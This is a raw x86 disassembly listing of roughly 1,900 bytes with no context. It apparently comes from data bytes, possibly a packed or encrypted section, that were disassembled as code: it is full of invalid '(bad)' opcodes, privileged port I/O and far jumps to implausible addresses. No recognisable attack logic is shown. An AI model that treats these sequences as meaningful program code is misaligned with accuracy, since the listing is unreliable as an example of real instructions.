  419969:	sub    BYTE PTR [esi+0x1d9a07c7],al
  41996f:	jp     0x41991a
  419971:	lods   al,BYTE PTR ds:[esi]
  419972:	nop    DWORD PTR [edx]
  419975:	in     al,dx
  419976:	in     al,0xa5
  419978:	popf   
  419979:	xchg   DWORD PTR [edi+edi*1],edi
  41997c:	add    eax,0xfffe34be
  419981:	push   0xffffffdf
  419983:	push   esp
  419984:	xchg   DWORD PTR [ebx+0x16947abf],edi
  41998a:	scas   eax,DWORD PTR es:[edi]
  41998b:	rol    DWORD PTR [esi],1
  41998d:	inc    ebp
  41998e:	adc    edi,esi
  419990:	ret    0x7a2
  419993:	test   DWORD PTR [edi+edx*2-0x5],edi
  419997:	(bad)  
  419998:	jo     0x4199a4
  41999a:	enter  0x6b04,0x28
  41999e:	pop    edx
  41999f:	scas   al,BYTE PTR es:[edi]
  4199a0:	mov    ds:0x42e2906b,al
  4199a5:	repnz mov edi,0x97702977
  4199ab:	call   0xc6d1a039
  4199b0:	jb     0x419974
  4199b2:	dec    eax
  4199b3:	ss div cl
  4199b6:	mov    edx,0x4bb07281
  4199bb:	mov    al,ds:0x47fa510a
  4199c0:	loopne 0x419945
  4199c2:	dec    ecx
  4199c3:	jo     0x419a3a
  4199c5:	mov    eax,0x51c58225
  4199ca:	mov    ebx,0x795c4545
  4199cf:	sbb    ecx,ebp
  4199d1:	xor    DWORD PTR [ebp-0x1a0639c6],edi
  4199d7:	and    dl,BYTE PTR [edx-0x3274ba4a]
  4199dd:	pop    eax
  4199de:	mov    al,BYTE PTR [edx+edx*8+0x4e437194]
  4199e5:	cmp    ebx,DWORD PTR [eax-0x2a]
  4199e8:	mov    ds:0x9d9c7fea,eax
  4199ed:	pop    ecx
  4199ee:	loopne 0x419a6c
  4199f0:	mov    bl,0x8e
  4199f2:	cmp    edi,DWORD PTR [eax+0x67038993]
  4199f8:	or     ecx,DWORD PTR ds:0xa60726ae
  4199fe:	sbb    eax,0xc8676e9a
  419a03:	pop    ds
  419a04:	jmp    0x419a44
  419a06:	mov    al,ds:0x50aad7f9
  419a0b:	ins    DWORD PTR es:[edi],dx
  419a0c:	sub    eax,0x5a16d8ef
  419a11:	mov    al,BYTE PTR [ecx]
  419a13:	add    eax,0x19b4a349
  419a18:	test   al,0xea
  419a1a:	mov    esi,0x9a867244
  419a1f:	mov    ebx,0xe98fcc21
  419a24:	or     DWORD PTR [edi],eax
  419a26:	mov    edi,DWORD PTR [ebp-0x5b]
  419a29:	pop    edi
  419a2a:	dec    esp
  419a2b:	push   es
  419a2c:	scas   al,BYTE PTR es:[edi]
  419a2d:	cmp    al,0xbd
  419a2f:	repz cmp al,0xea
  419a32:	mov    ch,0x5c
  419a34:	fild   QWORD PTR [esi+0x2c4ba057]
  419a3a:	adc    ah,0xde
  419a3d:	push   esi
  419a3e:	ins    BYTE PTR es:[edi],dx
  419a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a40:	js     0x4199e0
  419a42:	inc    esp
  419a43:	repnz fcomip st,st(4)
  419a46:	loopne 0x419a81
  419a48:	jbe    0x419a7d
  419a4a:	(bad)  
  419a4b:	cli    
  419a4c:	ret    0x2e8e
  419a4f:	out    0xc6,al
  419a51:	cs push ebx
  419a53:	cdq    
  419a54:	mov    ecx,0x73e7d61
  419a59:	adc    BYTE PTR [edi+0x4d],dh
  419a5c:	xlat   BYTE PTR ds:[ebx]
  419a5d:	mov    ebp,0x3e68051d
  419a62:	sar    DWORD PTR [esi+esi*4-0x1f],0xa1
  419a67:	xchg   edi,eax
  419a68:	pop    edx
  419a69:	sub    BYTE PTR [ebx+0x2dbf3e7f],ch
  419a6f:	es stos BYTE PTR es:[edi],al
  419a71:	shl    al,cl
  419a73:	stos   BYTE PTR es:[edi],al
  419a74:	push   edx
  419a75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a76:	and    al,bh
  419a78:	pop    ebp
  419a79:	xor    cl,bl
  419a7b:	nop
  419a7c:	push   ebp
  419a7d:	lods   al,BYTE PTR ds:[esi]
  419a7e:	mov    eax,DWORD PTR ds:0x30b3706b
  419a84:	aad    0xc7
  419a86:	jno    0x419aa6
  419a88:	in     eax,0x72
  419a8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a8b:	mov    cl,0x60
  419a8d:	xchg   ecx,eax
  419a8e:	clc    
  419a8f:	jg     0x419aaa
  419a91:	dec    esi
  419a92:	int3   
  419a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a94:	cmp    BYTE PTR [eax-0x1d176bc2],bh
  419a9a:	fadd   DWORD PTR [ebp+0x3df678b6]
  419aa0:	cs mov ebp,0x5592a5ef
  419aa6:	fcmovb st,st(4)
  419aa8:	cs sahf 
  419aaa:	mov    al,0xf2
  419aac:	push   cs
  419aad:	jno    0x419a48
  419aaf:	pop    ss
  419ab0:	cmp    al,BYTE PTR [edx-0x78]
  419ab3:	adc    DWORD PTR [ecx+eiz*4],edx
  419ab6:	push   0xa70e1306
  419abb:	adc    eax,0xeefde4eb
  419ac0:	pop    edx
  419ac1:	sbb    BYTE PTR [eax+0x69],0x46
  419ac5:	repz aaa 
  419ac7:	dec    ecx
  419ac8:	dec    ebx
  419ac9:	adc    al,0x40
  419acb:	push   ebx
  419acc:	imul   ecx,ebp,0x21
  419acf:	pusha  
  419ad0:	lods   eax,DWORD PTR ds:[esi]
  419ad1:	push   ds
  419ad2:	iret   
  419ad3:	ins    BYTE PTR es:[edi],dx
  419ad4:	xor    dl,dl
  419ad6:	sub    al,0x77
  419ad8:	add    ecx,esi
  419ada:	sbb    DWORD PTR [ecx+0x18],ebp
  419add:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ade:	ficomp DWORD PTR [edx+ebp*8-0x33c19754]
  419ae5:	inc    edx
  419ae6:	sub    al,0x8a
  419ae8:	call   0xe8e80ba
  419aed:	push   ds
  419aee:	sub    eax,0x9eeedda8
  419af3:	mov    ah,0xe3
  419af5:	xchg   esp,eax
  419af6:	pop    es
  419af7:	(bad)  
  419af8:	mov    edx,0x10140e29
  419afd:	add    al,0xe7
  419aff:	ds cmc 
  419b01:	sbb    al,0xc9
  419b03:	adc    al,0x14
  419b05:	in     al,dx
  419b06:	adc    ch,BYTE PTR [esi-0x44]
  419b09:	or     ecx,edx
  419b0b:	lahf   
  419b0c:	sahf   
  419b0d:	daa    
  419b0e:	lods   al,BYTE PTR ds:[esi]
  419b0f:	repz sbb al,0xd
  419b12:	outs   dx,BYTE PTR ds:[esi]
  419b13:	call   0x884c1d22
  419b18:	cmp    al,0xb8
  419b1a:	int3   
  419b1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b1c:	dec    ebx
  419b1d:	pop    edx
  419b1e:	cdq    
  419b1f:	inc    BYTE PTR [edi]
  419b21:	mov    edi,0x3c3758e
  419b26:	gs test edx,edi
  419b29:	push   edx
  419b2a:	and    BYTE PTR [ebp+0x303dbd25],cl
  419b30:	jmp    0x43a1:0x33294bf1
  419b37:	xor    al,0x89
  419b39:	sbb    esi,DWORD PTR ds:0xc1d328c0
  419b3f:	ss adc eax,0x3fd23a77
  419b45:	mov    esi,0x6a794cdd
  419b4a:	push   0x73
  419b4c:	jbe    0x419b1c
  419b4e:	jmp    0x419b84
  419b50:	das    
  419b51:	pop    edx
  419b52:	pop    edi
  419b53:	dec    esp
  419b54:	xor    BYTE PTR [edi-0x64],dh
  419b57:	sub    BYTE PTR [ebp-0x14e5ea57],bl
  419b5d:	sub    esp,DWORD PTR [ebp+0x2d2a1610]
  419b63:	ffreep st(1)
  419b65:	xchg   DWORD PTR [eax-0x312fad50],edi
  419b6b:	inc    edi
  419b6c:	inc    edi
  419b6d:	sub    al,0x8
  419b6f:	out    dx,al
  419b70:	clc    
  419b71:	int    0x41
  419b73:	adc    eax,DWORD PTR [edi]
  419b75:	cwde   
  419b76:	mov    ch,0x9e
  419b78:	push   ebp
  419b79:	pop    ss
  419b7a:	add    BYTE PTR [edx],ch
  419b7c:	lea    edi,ds:0x79cae993
  419b82:	aad    0x91
  419b84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b85:	cdq    
  419b86:	or     eax,0x4e739075
  419b8b:	outs   dx,DWORD PTR ds:[esi]
  419b8c:	adc    DWORD PTR [esi-0x5fc1aa05],edi
  419b92:	dec    esi
  419b93:	es and eax,0xb2dd665
  419b99:	jo     0x419c1a
  419b9b:	in     eax,dx
  419b9c:	cdq    
  419b9d:	jb     0x419b3b
  419b9f:	and    ecx,edx
  419ba1:	popa   
  419ba2:	mov    edx,0x3a1e047d
  419ba7:	jno    0x419bd2
  419ba9:	cmp    ch,BYTE PTR [edi+0x71]
  419bac:	or     al,0xf8
  419bae:	add    eax,0x7813761d
  419bb3:	loopne 0x419bb6
  419bb5:	xchg   esi,eax
  419bb6:	or     al,0x21
  419bb8:	add    bh,bh
  419bba:	scas   eax,DWORD PTR es:[edi]
  419bbb:	retf   0xcad
  419bbe:	(bad)  
  419bc0:	test   al,0x9b
  419bc2:	pushf  
  419bc3:	test   eax,0x94a378e9
  419bc8:	mov    esi,0x1dd94ca0
  419bcd:	ins    DWORD PTR es:[edi],dx
  419bce:	cmp    ebp,DWORD PTR [ebp-0x2382e10f]
  419bd4:	and    DWORD PTR [esi+0x4eaa2494],edi
  419bda:	repz not DWORD PTR [ecx]
  419bdd:	mov    dl,0xf8
  419bdf:	in     eax,0xb
  419be1:	jl     0x419bb7
  419be3:	repz and al,0xab
  419be6:	adc    al,0xff
  419be8:	xor    al,0x8
  419bea:	call   0x7497:0xf750e9be
  419bf1:	lods   eax,DWORD PTR ds:[esi]
  419bf2:	mov    al,0xed
  419bf4:	loopne 0x419b9b
  419bf6:	stos   DWORD PTR es:[edi],eax
  419bf7:	cdq    
  419bf8:	jp     0x419c10
  419bfa:	jle    0x419bd9
  419bfc:	sbb    al,0xb
  419bfe:	(bad)
  419c02:	mov    ch,0xa8
  419c04:	(bad)
  419c08:	fild   WORD PTR [eax+0x4c]
  419c0b:	popf   
  419c0c:	leave  
  419c0d:	dec    ecx
  419c0e:	mov    eax,0x4aea2bb4
  419c13:	ret    
  419c14:	mov    ds:0x83bc4051,eax
  419c19:	xor    DWORD PTR [edi],edi
  419c1b:	dec    ebp
  419c1c:	scas   eax,DWORD PTR es:[edi]
  419c1d:	pop    esp
  419c1e:	pop    es
  419c1f:	lds    ebx,FWORD PTR [ecx+0x2c]
  419c22:	je     0x419c4a
  419c24:	adc    DWORD PTR [ebp-0x1f],edx
  419c27:	push   ds
  419c28:	and    al,0x8a
  419c2a:	push   ss
  419c2b:	cmc    
  419c2c:	or     BYTE PTR [ebx-0x1d3f9216],0x78
  419c33:	pop    ecx
  419c34:	jl     0x419c8a
  419c36:	pop    edi
  419c37:	mov    gs,WORD PTR [ebp+esi*8+0xf9cd2b5]
  419c3e:	stos   DWORD PTR es:[edi],eax
  419c3f:	dec    esp
  419c41:	mov    dl,BYTE PTR [ebx]
  419c43:	add    ecx,DWORD PTR [eax-0x5a5cbda0]
  419c49:	addr16 xchg ebx,eax
  419c4b:	aad    0x3a
  419c4d:	xor    eax,0x2441f657
  419c52:	fadd   QWORD PTR [edx-0x60caa58f]
  419c58:	xlat   BYTE PTR ds:[ebx]
  419c59:	mov    esi,0x13beb012
  419c5e:	xor    DWORD PTR [edi+0x5a8470db],edx
  419c64:	gs push eax
  419c66:	mov    WORD PTR [esp+edi*2-0x75d5273a],ds
  419c6d:	fwait
  419c6e:	push   cs
  419c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c70:	sbb    BYTE PTR [esi],al
  419c72:	mov    eax,ss
  419c74:	jnp    0x419bfc
  419c76:	fdivr  DWORD PTR [ecx+0x21]
  419c79:	fisttp DWORD PTR [edx+0x54]
  419c7c:	jmp    0x419c36
  419c7e:	dec    DWORD PTR ds:0x7d88e439
  419c84:	cdq    
  419c85:	stos   DWORD PTR es:[edi],eax
  419c86:	dec    eax
  419c87:	mov    esp,0xc7a1ad4b
  419c8c:	adc    DWORD PTR [edx+0x2bd0ba],edx
  419c92:	dec    ebx
  419c93:	repz js 0x419d14
  419c96:	xchg   ecx,eax
  419c97:	xchg   ebp,eax
  419c98:	mov    ds:0xd3e51c0a,eax
  419c9d:	push   ebx
  419c9e:	enter  0x2f77,0x61
  419ca2:	mov    eax,ds:0xa79a63a1
  419ca7:	mov    WORD PTR [eax],gs
  419ca9:	jo     0x419ce1
  419cab:	out    0x43,eax
  419cad:	test   al,0x11
  419caf:	int3   
  419cb0:	and    al,0x33
  419cb2:	and    BYTE PTR [ecx],bh
  419cb4:	rcpps  xmm5,XMMWORD PTR [eax+0x77]
  419cb8:	ja     0x419cdd
  419cba:	in     eax,0x7a
  419cbc:	sub    BYTE PTR [edi],0x7
  419cbf:	mov    ecx,0x5ac147f0
  419cc4:	pop    esi
  419cc5:	mov    edi,0x5fedda31
  419cca:	arpl   WORD PTR [ebx-0x459a4a9a],si
  419cd0:	leave  
  419cd1:	cmp    BYTE PTR [esi+0x37],dh
  419cd4:	xor    eax,0x368468b4
  419cd9:	mov    al,0x2b
  419cdb:	cwde   
  419cdc:	xor    ch,BYTE PTR [ebx-0x3a]
  419cdf:	fst    DWORD PTR [eax-0x6e]
  419ce2:	mov    ds:0xbd5e475b,eax
  419ce7:	mov    cl,0x7b
  419ce9:	sbb    BYTE PTR [esi+0xd726857],cl
  419cef:	adc    DWORD PTR [esi],ecx
  419cf1:	std    
  419cf2:	push   ss
  419cf3:	sub    esi,DWORD PTR [eax-0x4030960b]
  419cf9:	inc    ecx
  419cfa:	sub    cl,dh
  419cfc:	call   0xbcfa94dd
  419d01:	dec    ebp
  419d02:	sub    eax,ebp
  419d04:	mov    esi,DWORD PTR [eax+0x3]
  419d07:	out    0x20,eax
  419d09:	cmp    edx,DWORD PTR [ebp+ebp*8-0x3be479c2]
  419d10:	fbstp  TBYTE PTR [eax]
  419d12:	pop    ecx
  419d13:	xchg   BYTE PTR [ebx],ah
  419d15:	test   edi,esi
  419d17:	mov    al,ds:0x4b6877d9
  419d1c:	push   esp
  419d1d:	mov    ebx,0xd50187dc
  419d22:	dec    edx
  419d23:	fld    DWORD PTR [edi+0x49]
  419d26:	stos   DWORD PTR es:[edi],eax
  419d27:	mov    bl,0x2e
  419d29:	dec    esi
  419d2a:	ss js  0x419d74
  419d2d:	or     al,0xc
  419d2f:	push   eax
  419d30:	dec    ecx
  419d31:	lods   eax,DWORD PTR ds:[esi]
  419d32:	mov    DWORD PTR [ebp-0x4c968b85],esi
  419d38:	mov    al,ds:0x57839664
  419d3d:	push   esp
  419d3e:	js     0x419ce3
  419d40:	cli    
  419d41:	fsubr  DWORD PTR [edi]
  419d43:	mov    eax,0xed5a13e6
  419d48:	(bad)  
  419d49:	adc    eax,0x93d6aee8
  419d4e:	add    cl,BYTE PTR [ebx]
  419d50:	fadd   DWORD PTR [ebx+0x8]
  419d53:	fnsave [ebx-0x4888523b]
  419d59:	push   ebx
  419d5a:	fld    DWORD PTR [eax-0x25]
  419d5d:	test   eax,0xda6d75ca
  419d62:	mov    ds:0xa6432c7b,al
  419d67:	mov    ah,0x17
  419d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d6b:	add    al,0xed
  419d6d:	jecxz  0x419da3
  419d6f:	ins    BYTE PTR es:[edi],dx
  419d70:	(bad)  
  419d71:	sbb    ebp,ebp
  419d73:	loopne 0x419d6c
  419d75:	mov    edi,edx
  419d77:	(bad)  
  419d78:	stos   BYTE PTR es:[edi],al
  419d79:	test   DWORD PTR [eax-0x78],edi
  419d7c:	add    al,0x4
  419d7e:	add    cl,BYTE PTR [edi]
  419d80:	sub    ah,BYTE PTR [ecx+0x136f5f14]
  419d86:	cmp    esi,edx
  419d88:	push   esi
  419d89:	push   ds
  419d8a:	xlat   BYTE PTR ds:[ebx]
  419d8b:	adc    ch,BYTE PTR [ebp+0x48a16cbf]
  419d91:	push   cs
  419d92:	(bad)  
  419d93:	push   ecx
  419d94:	adc    eax,0x62154229
  419d99:	sub    BYTE PTR [edx-0x62],bl
  419d9c:	out    dx,eax
  419d9d:	fidivr WORD PTR [ebp+edx*2+0x44]
  419da1:	inc    ebp
  419da2:	xlat   BYTE PTR es:[ebx]
  419da4:	outs   dx,DWORD PTR ds:[esi]
  419da5:	sbb    BYTE PTR [edi-0x7d],bl
  419da8:	xlat   BYTE PTR ds:[ebx]
  419da9:	and    esp,esp
  419dab:	pop    edi
  419dac:	or     cl,ah
  419dae:	mov    ds:0x191ebf8e,al
  419db3:	pop    esp
  419db4:	or     ebx,DWORD PTR [edi-0x3cde9a14]
  419dba:	icebp  
  419dbb:	sti    
  419dbc:	je     0x419dd0
  419dbe:	cmc    
  419dbf:	sub    eax,0xc244dff
  419dc4:	in     al,0x38
  419dc6:	or     eax,0x90ea00c8
  419dcb:	xchg   DWORD PTR [ebp-0x6f],ecx
  419dce:	mov    ds:0x7cd8684e,eax
  419dd3:	add    ah,BYTE PTR [esi-0x3dd4606a]
  419dd9:	sub    eax,0x2b80b856
  419dde:	fs xor eax,0x9f49d789
  419de4:	adc    ebx,edx
  419de6:	iret   
  419de7:	xor    esi,DWORD PTR [ebp+0x1ef837ee]
  419ded:	mov    ds:0xe4c7d7e9,eax
  419df2:	leave  
  419df3:	div    BYTE PTR [edx+0x29]
  419df6:	scas   al,BYTE PTR es:[edi]
  419df7:	stos   DWORD PTR es:[edi],eax
  419df8:	popf   
  419df9:	jnp    0x419e0f
  419dfb:	mov    bh,0x4c
  419dfd:	js     0x419dce
  419dff:	mov    bh,0xa7
  419e01:	pop    ss
  419e02:	pop    ecx
  419e03:	mov    esp,ss
  419e05:	inc    edx
  419e06:	sub    BYTE PTR [eax],dl
  419e08:	enter  0xadb,0x65
  419e0c:	mov    ch,0xfa
  419e0e:	jl     0x419db5
  419e10:	push   esp
  419e11:	or     dh,BYTE PTR [ebx]
  419e13:	push   ecx
  419e14:	je     0x419de2
  419e16:	push   edx
  419e17:	add    eax,0x5e08231d
  419e1c:	jnp    0x419e04
  419e1e:	dec    edx
  419e1f:	inc    ebp
  419e20:	mov    al,dl
  419e22:	aaa    
  419e23:	out    0xbf,eax
  419e25:	sysexit 
  419e27:	xchg   esp,eax
  419e28:	xchg   edi,eax
  419e29:	mov    BYTE PTR [esi-0x217280e2],bh
  419e2f:	nop
  419e30:	lock (bad) 
  419e33:	sti    
  419e34:	and    DWORD PTR [edi-0x6a],esp
  419e37:	mov    cs,WORD PTR [edx+0x5b]
  419e3a:	mov    bl,0x65
  419e3c:	cmp    al,BYTE PTR [ebp+0x76]
  419e3f:	(bad)  
  419e40:	retf   
  419e41:	(bad)  
  419e42:	lock sbb eax,0x8ca189a7
  419e48:	sbb    al,0xf6
  419e4a:	inc    ebx
  419e4b:	adc    ebx,ebx
  419e4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e4e:	lods   al,BYTE PTR ds:[esi]
  419e4f:	ja     0x419eb0
  419e51:	dec    edx
  419e52:	jns    0x419e09
  419e54:	ins    DWORD PTR es:[edi],dx
  419e55:	retf   0x3fbb
  419e58:	lods   eax,DWORD PTR ds:[esi]
  419e59:	fcomp  QWORD PTR [edx-0x2e61a91f]
  419e5f:	add    dh,BYTE PTR [esp+eax*2-0x48]
  419e63:	mov    cl,BYTE PTR [esi+0x16]
  419e66:	sbb    esi,edi
  419e68:	outs   dx,BYTE PTR ds:[esi]
  419e69:	xchg   edx,eax
  419e6a:	xor    bl,BYTE PTR [edx+0x162c9748]
  419e70:	in     eax,0xc4
  419e72:	repnz sub BYTE PTR [esi+eiz*4-0x77],dl
  419e77:	push   cs
  419e78:	mov    dh,0x48
  419e7a:	jbe    0x419e72
  419e7c:	fcomp  QWORD PTR [edx+0x2]
  419e7f:	pop    eax
  419e80:	in     al,dx
  419e81:	dec    ebx
  419e82:	adc    BYTE PTR [esi],0x6b
  419e85:	and    BYTE PTR [edx-0x1d98bf04],al
  419e8b:	jno    0x419e80
  419e8d:	outs   dx,DWORD PTR ds:[esi]
  419e8e:	fisubr WORD PTR [ecx-0x398a48c0]
  419e94:	stc    
  419e95:	daa    
  419e96:	sar    DWORD PTR [ecx+ebp*8-0x619cd6c0],cl
  419e9d:	mov    ebx,DWORD PTR [edi+0x56]
  419ea0:	bound  edx,QWORD PTR ds:0x28377742
  419ea6:	add    BYTE PTR [esi+0x26],ch
  419ea9:	xor    esi,DWORD PTR [ebx+0x55]
  419eac:	push   esp
  419ead:	mov    ss:0x8f54e379,al
  419eb3:	mov    al,ds:0x949ef965
  419eb8:	pop    es
  419eb9:	repz loope 0x419e97
  419ebc:	sub    al,0x80
  419ebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ebf:	stc    
  419ec0:	ret    0x37ff
  419ec3:	outs   dx,BYTE PTR ds:[esi]
  419ec4:	imul   esi,DWORD PTR [esp+edi*4],0x3e986c8c
  419ecb:	test   al,0x8b
  419ecd:	cmp    BYTE PTR [esi],al
  419ecf:	sbb    dl,bh
  419ed1:	mov    esi,0x91e638bb
  419ed6:	inc    edx
  419ed7:	xor    al,0x2c
  419ed9:	adc    dl,ah
  419edb:	xor    cl,0xaa
  419ede:	retf   0x3918
  419ee1:	jmp    0x2539:0xa3f5543f
  419ee8:	mov    edi,0x2195c959
  419eed:	push   ebp
  419eee:	aad    0x92
  419ef0:	push   eax
  419ef1:	fdiv   QWORD PTR ss:[eax]
  419ef4:	call   0x7aa96fda
  419ef9:	aas    
  419efa:	in     eax,dx
  419efb:	xor    ebx,DWORD PTR [ebx+ebx*1-0x22a2b4e3]
  419f02:	push   ebp
  419f03:	xor    DWORD PTR ds:[ebx-0x1d5b27d7],edi
  419f0a:	inc    esi
  419f0b:	in     eax,dx
  419f0c:	sbb    eax,0x3dd99018
  419f11:	mov    ds:0x4baf4017,eax
  419f16:	mov    dh,0xb0
  419f18:	inc    ebp
  419f19:	lods   eax,DWORD PTR ds:[esi]
  419f1a:	sbb    al,0x16
  419f1c:	icebp  
  419f1d:	loop   0x419f2b
  419f1f:	imul   DWORD PTR [esi]
  419f21:	or     al,0xe5
  419f23:	sar    BYTE PTR [ebp+0x17],cl
  419f26:	outs   dx,DWORD PTR ds:[esi]
  419f27:	std    
  419f28:	daa    
  419f29:	mov    ah,0x38
  419f2b:	retf   
  419f2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f2d:	das    
  419f2e:	fs push es
  419f30:	xchg   esi,eax
  419f31:	fadd   QWORD PTR [edx+ebx*2+0x29]
  419f35:	and    BYTE PTR [ebx+0x486d908e],dh
  419f3b:	ds sbb eax,0x27cc1e87
  419f41:	sub    al,0xf6
  419f43:	adc    ebp,DWORD PTR [ebx-0x3edb8382]
  419f49:	inc    eax
  419f4a:	jno    0x419f75
  419f4c:	push   esi
  419f4d:	repz inc eax
  419f4f:	mov    al,dh
  419f51:	lahf   
  419f52:	ret    
  419f53:	out    dx,eax
  419f54:	cmp    BYTE PTR [edx],bh
  419f56:	(bad)  
  419f57:	mov    eax,0xa6a3e983
  419f5c:	or     cl,BYTE PTR [ebx+0x14b92636]
  419f62:	or     ah,bh
  419f64:	sbb    edi,DWORD PTR [edi-0x72]
  419f67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f68:	mov    esp,0x491bf129
  419f6d:	cs stc 
  419f6f:	or     BYTE PTR [edi],ch
  419f71:	ja     0x419fa4
  419f73:	dec    eax
  419f74:	(bad)  
  419f75:	es int 0xf0
  419f78:	jbe    0x419f9c
  419f7a:	and    bh,BYTE PTR [esi]
  419f7c:	jle    0x419f83
  419f7e:	inc    esi
  419f7f:	inc    ebp
  419f80:	jmp    0xb41d508
  419f85:	jmp    0x9e64d493
  419f8a:	or     edi,eax
  419f8c:	in     eax,dx
  419f8d:	jnp    0x41a007
  419f8f:	adc    esp,DWORD PTR [ebp-0x54e2ebf]
  419f95:	and    eax,0x8dbaa260
  419f9a:	pop    edi
  419f9b:	add    eax,0xe59ff242
  419fa0:	push   0xb937b8fb
  419fa5:	dec    ebx
  419fa6:	std    
  419fa7:	hlt    
  419fa8:	push   ecx
  419fa9:	stos   DWORD PTR es:[edi],eax
  419faa:	xchg   edx,eax
  419fab:	jge    0x419f63
  419fad:	pusha  
  419fae:	and    eax,0x52000dd8
  419fb3:	xor    BYTE PTR [ecx],dl
  419fb5:	push   edx
  419fb6:	xor    edx,DWORD PTR [ecx+esi*4+0x65981a67]
  419fbd:	adc    BYTE PTR ds:0xfb1ce5f5,dl
  419fc3:	push   ecx
  419fc4:	cmp    al,0x32
  419fc6:	jecxz  0x419f48
  419fc8:	test   al,0x4b
  419fca:	into   
  419fcb:	mov    edi,ebp
  419fcd:	mov    dh,0x7c
  419fcf:	dec    ebp
  419fd0:	mov    ?,WORD PTR [ebp+0x3f]
  419fd3:	adc    al,0x8d
  419fd5:	aam    0x26
  419fd7:	push   edi
  419fd8:	pop    ss
  419fd9:	xor    BYTE PTR [edi-0xd],bl
  419fdc:	sti    
  419fdd:	ins    BYTE PTR es:[edi],dx
  419fde:	(bad)  
  419fdf:	push   eax
  419fe0:	mov    al,0x5f
  419fe2:	fdiv   st(4),st
  419fe4:	inc    eax
  419fe5:	xor    dh,BYTE PTR [ebp+0x79]
  419fe8:	mov    eax,ds:0x4b850c35
  419fed:	aas    
  419fee:	sbb    eax,0x1bd4e5ee
  419ff3:	pusha  
  419ff4:	sahf   
  419ff5:	je     0x41a067
  419ff7:	retf   
  419ff8:	sahf   
  419ff9:	add    eax,0x236412ad
  419ffe:	sahf   
  419fff:	sub    esi,DWORD PTR [ebx+edi*4]
  41a002:	stos   DWORD PTR es:[edi],eax
  41a003:	daa    
  41a004:	jnp    0x41a00c
  41a006:	mov    ebx,DWORD PTR [ebp+0x31]
  41a009:	jno    0x419ff0
  41a00b:	mov    dl,BYTE PTR [bx+0x70]
  41a00f:	add    BYTE PTR [ebx+0x75],dl
  41a012:	ret    0x43b1
  41a015:	mov    dl,BYTE PTR [eax]
  41a017:	cmp    ah,BYTE PTR [edi]
  41a019:	fisttp QWORD PTR [edx+0x5571b48e]
  41a01f:	fs jmp 0x41a040
  41a022:	xchg   ah,ch
  41a024:	push   ecx
  41a025:	mov    ds:0x37fcfa87,al
  41a02a:	xchg   ecx,eax
  41a02b:	jl     0x41a078
  41a02d:	mov    dh,0x2b
  41a02f:	shl    BYTE PTR ss:[ecx],1
  41a032:	mov    ds:0x8862d0ef,al
  41a037:	jbe    0x41a065
  41a039:	mov    edi,0x445d5f1f
  41a03e:	cmp    BYTE PTR [esi+0x35],0x7e
  41a042:	push   ss
  41a043:	mov    eax,ds:0x3110862b
  41a048:	mov    DWORD PTR [ebp-0x66],0x8be68426
  41a04f:	aad    0x16
  41a051:	sub    al,0x3c
  41a053:	arpl   cx,di
  41a055:	adc    al,0xe2
  41a057:	pop    esp
  41a058:	xor    al,0x37
  41a05a:	frstor [ebx-0x2f]
  41a05d:	add    BYTE PTR [ebp+0x7b],bl
  41a060:	ins    BYTE PTR es:[edi],dx
  41a061:	js     0x41a0bf
  41a063:	or     DWORD PTR [edi],esi
  41a065:	xchg   esp,eax
  41a066:	mov    edx,0xda3b19b
  41a06b:	dec    esi
  41a06c:	jg     0x41a03d
  41a06e:	jl     0x41a0e2
  41a070:	xlat   BYTE PTR ss:[ebx]
  41a072:	mov    dl,BYTE PTR [eax-0x1cd49e10]
  41a078:	pcmpeqd mm3,mm6
  41a07b:	push   edx
  41a07c:	push   0x36
  41a07e:	inc    ecx
  41a07f:	or     eax,0xdcfe87ae
  41a084:	add    eax,esp
  41a086:	jbe    0x41a0d7
  41a088:	lods   eax,DWORD PTR ds:[esi]
  41a089:	push   ebp
  41a08a:	push   0x42
  41a08c:	jno    0x41a0a5
  41a08e:	neg    ebp
  41a090:	shr    DWORD PTR [ebp-0x31],cl
  41a093:	pop    esp
  41a094:	cli    
  41a095:	ret    
  41a096:	test   BYTE PTR [ebx],dl
  41a098:	inc    eax
  41a099:	jmp    0xcff0:0xde73c89a
  41a0a0:	packsswb mm0,QWORD PTR [esi+0x3f]
  41a0a4:	in     al,0x74
  41a0a6:	or     BYTE PTR [ebx-0x47],ch
  41a0a9:	mov    bh,0x49
  41a0ab:	jbe    0x41a11a
  41a0ad:	xor    edi,DWORD PTR [eax-0x65]
  41a0b0:	jg     0x41a07b
  41a0b2:	jmp    0x41a07c
  41a0b4:	inc    ebx
  41a0b5:	fmul   QWORD PTR [edi+0x15251d06]
  41a0bb:	jne    0x41a058
  41a0bd:	sbb    dl,BYTE PTR [ecx-0x36]
  41a0c0:	ret    
  41a0c1:	(bad)  
  41a0c3:	mov    ecx,DWORD PTR [ebp+0x3b]
  41a0c6:	gs popaw 
  41a0c9:	adc    al,0xb0
  41a0cb:	adc    ah,dh
  41a0cd:	les    ebx,FWORD PTR [ecx+0x18]
  41a0d0:	popa   
  41a0d1:	push   ss
  41a0d2:	mov    ah,0xf6
  41a0d4:	pop    ds
  41a0d5:	sti    
  41a0d6:	sub    BYTE PTR [ecx+0x5aafb86a],ch
  41a0dc:	lahf   
  41a0dd:	test   al,0xd6
  41a0df:	clc    
  41a0e0:	clc    
  41a0e1:	(bad)  
  41a0e2:	in     al,dx
  41a0e3:	pop    ss
  41a0e4:	add    BYTE PTR [edx+ebx*2],al
  41a0e7:	(bad)  
  41a0e8:	push   eax
  41a0e9:	(bad)  
  41a0ea:	cli    
  41a0eb:	xor    BYTE PTR [edi],ah
  41a0ed:	outs   dx,DWORD PTR ds:[esi]
  41a0ee:	inc    esi
